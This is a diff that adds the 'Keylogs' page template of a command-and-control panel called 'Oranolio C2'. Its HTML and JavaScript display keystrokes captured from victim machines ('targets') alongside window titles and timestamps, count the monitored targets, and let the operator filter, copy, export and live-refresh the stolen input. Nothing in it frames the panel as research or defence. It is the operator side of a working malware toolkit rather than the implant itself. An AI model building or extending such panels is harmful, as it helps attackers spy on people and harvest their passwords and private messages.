@@ -1,0 +1,240 @@
+{% extends "dashboard/base.html" %}
+
+{% block title %}Keylogs - Oranolio C2{% endblock %}
+{% block page_title %}Keylogger{% endblock %}
+
+{% block content %}
+<div class="stats-grid">
+    <div class="stat-card">
+        <div class="stat-header">
+            <span class="stat-title">Total Keystrokes</span>
+            <div class="stat-icon primary"><i class="fas fa-keyboard"></i></div>
+        </div>
+        <div class="stat-value" id="totalKeystrokes">0</div>
+    </div>
+    
+    <div class="stat-card">
+        <div class="stat-header">
+            <span class="stat-title">Active Loggers</span>
+            <div class="stat-icon success"><i class="fas fa-check-circle"></i></div>
+        </div>
+        <div class="stat-value" id="activeLoggers">0</div>
+    </div>
+    
+    <div class="stat-card">
+        <div class="stat-header">
+            <span class="stat-title">Targets Monitored</span>
+            <div class="stat-icon warning"><i class="fas fa-crosshairs"></i></div>
+        </div>
+        <div class="stat-value" id="targetsMonitored">0</div>
+    </div>
+    
+    <div class="stat-card">
+        <div class="stat-header">
+            <span class="stat-title">Today's Logs</span>
+            <div class="stat-icon danger"><i class="fas fa-calendar-day"></i></div>
+        </div>
+        <div class="stat-value" id="todayLogs">0</div>
+    </div>
+</div>
+
+<div class="card">
+    <div class="card-header">
+        <h2 class="card-title">Keylogger Data</h2>
+        <div class="card-actions">
+            <select class="form-select" id="targetFilter" onchange="filterKeylogs()" style="min-width: 200px;">
+                <option value="all">All Targets</option>
+            </select>
+            <button class="btn btn-secondary btn-sm" onclick="refreshKeylogs()">
+                <i class="fas fa-sync-alt"></i> Refresh
+            </button>
+            <button class="btn btn-primary btn-sm" onclick="exportKeylogs()">
+                <i class="fas fa-download"></i> Export
+            </button>
+        </div>
+    </div>
+    
+    <div style="overflow-x: auto;">
+        <table class="table">
+            <thead>
+                <tr>
+                    <th>Target</th>
+                    <th>Window Title</th>
+                    <th>Keystrokes</th>
+                    <th>Timestamp</th>
+                    <th>Actions</th>
+                </tr>
+            </thead>
+            <tbody id="keylogsTableBody">
+                <tr><td colspan="5" style="text-align: center; padding: 40px;"><div class="spinner"></div></td></tr>
+            </tbody>
+        </table>
+    </div>
+</div>
+{% endblock %}
+
+{% block extra_js %}
+<script nonce="{{ g.csp_nonce }}">
+let allKeylogs = [];
+
+document.addEventListener('DOMContentLoaded', function() {
+    loadKeylogs();
+    loadTargetsFilter();
+    setInterval(loadKeylogs, 30000);
+});
+
+async function loadKeylogs() {
+    try {
+        const response = await fetch('/api/keylogs', {
+            headers: { 'X-CSRFToken': csrfToken }
+        });
+        
+        if (!response.ok) throw new Error('Failed to load keylogs');
+        
+        const data = await response.json();
+        allKeylogs = data.keylogs || [];
+        
+        renderKeylogs();
+        updateStats();
+    } catch (error) {
+        console.error('Error loading keylogs:', error);
+        document.getElementById('keylogsTableBody').innerHTML = `
+            <tr><td colspan="5" style="text-align: center; padding: 40px;">
+                <div class="empty-state">
+                    <i class="fas fa-exclamation-triangle"></i>
+                    <h3>Failed to load keylogs</h3>
+                    <p>${error.message}</p>
+                </div>
+            </td></tr>
+        `;
+    }
+}
+
+function renderKeylogs() {
+    const tbody = document.getElementById('keylogsTableBody');
+    const filter = document.getElementById('targetFilter').value;
+    
+    let filtered = allKeylogs;
+    if (filter !== 'all') {
+        filtered = allKeylogs.filter(k => k.target_id === filter);
+    }
+    
+    if (filtered.length === 0) {
+        tbody.innerHTML = `
+            <tr><td colspan="5" style="text-align: center; padding: 40px;">
+                <div class="empty-state">
+                    <i class="fas fa-keyboard"></i>
+                    <h3>No keylogs found</h3>
+                    <p>Keylogger data will appear here</p>
+                </div>
+            </td></tr>
+        `;
+        return;
+    }
+    
+    tbody.innerHTML = filtered.map(log => `
+        <tr>
+            <td><strong>${escapeHtml(log.target_hostname)}</strong></td>
+            <td>${escapeHtml(log.window_title)}</td>
+            <td>
+                <span id="keys-${log.id}" style="filter: blur(4px); cursor: pointer;" onclick="toggleKeys('${log.id}')">
+                    ${escapeHtml(log.keystrokes)}
+                </span>
+            </td>
+            <td>${formatDate(log.timestamp)}</td>
+            <td>
+                <button class="btn btn-secondary btn-sm" onclick="copyToClipboard('${escapeHtml(log.keystrokes)}')" title="Copy">
+                    <i class="fas fa-copy"></i>
+                </button>
+            </td>
+        </tr>
+    `).join('');
+}
+
+function toggleKeys(id) {
+    const el = document.getElementById(`keys-${id}`);
+    el.style.filter = el.style.filter === 'blur(4px)' ? 'none' : 'blur(4px)';
+}
+
+function updateStats() {
+    const totalKeys = allKeylogs.reduce((sum, log) => sum + log.keystrokes.length, 0);
+    document.getElementById('totalKeystrokes').textContent = totalKeys;
+    
+    const uniqueTargets = new Set(allKeylogs.map(k => k.target_id)).size;
+    document.getElementById('targetsMonitored').textContent = uniqueTargets;
+    document.getElementById('activeLoggers').textContent = uniqueTargets;
+    
+    const today = new Date();
+    today.setHours(0, 0, 0, 0);
+    const todayCount = allKeylogs.filter(k => new Date(k.timestamp) >= today).length;
+    document.getElementById('todayLogs').textContent = todayCount;
+}
+
+async function loadTargetsFilter() {
+    try {
+        const response = await fetch('/api/targets', {
+            headers: { 'X-CSRFToken': csrfToken }
+        });
+        
+        if (!response.ok) return;
+        
+        const data = await response.json();
+        const select = document.getElementById('targetFilter');
+        
+        data.targets.forEach(target => {
+            const option = document.createElement('option');
+            option.value = target.id;
+            option.textContent = target.hostname;
+            select.appendChild(option);
+        });
+    } catch (error) {
+        console.error('Error loading targets:', error);
+    }
+}
+
+function filterKeylogs() {
+    renderKeylogs();
+}
+
+function refreshKeylogs() {
+    loadKeylogs();
+    showNotification('Keylogs refreshed', 'info');
+}
+
+function exportKeylogs() {
+    const text = allKeylogs.map(k => 
+        `[${k.timestamp}] ${k.target_hostname} - ${k.window_title}\n${k.keystrokes}\n`
+    ).join('\n');
+    
+    const blob = new Blob([text], { type: 'text/plain' });
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = `keylogs_${new Date().toISOString().split('T')[0]}.txt`;
+    a.click();
+    URL.revokeObjectURL(url);
+    
+    showNotification('Keylogs exported', 'success');
+}
+
+function copyToClipboard(text) {
+    navigator.clipboard.writeText(text).then(() => {
+        showNotification('Copied to clipboard', 'success');
+    });
+}
+
+function formatDate(dateString) {
+    return new Date(dateString).toLocaleString();
+}
+
+function escapeHtml(text) {
+    const div = document.createElement('div');
+    div.textContent = text;
+    return div.innerHTML;
+}
+
+socket.on('new_keylog', function(data) {
+    loadKeylogs();
+});
+</script>
+{% endblock %}
